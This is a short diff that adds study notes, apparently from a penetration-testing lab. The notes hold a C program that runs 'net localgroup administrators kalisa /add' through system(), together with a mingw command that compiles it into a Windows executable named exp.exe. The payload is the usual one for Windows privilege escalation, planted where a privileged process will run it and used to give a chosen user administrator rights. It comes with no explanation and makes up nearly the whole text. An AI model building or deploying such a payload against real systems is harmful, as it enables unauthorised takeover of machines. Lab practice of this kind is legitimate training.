@@ -1,0 +1,15 @@
+# Basic C code to add kalisa user to the administrator group 
+
+#include <stdlib.h>
+int main () {
+    int i;
+    i = system("net localgroup administrators kalisa /add");
+    return 0;
+}
+
+# compile the C code
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+
+------------------------------------------------------------------------------
+
+
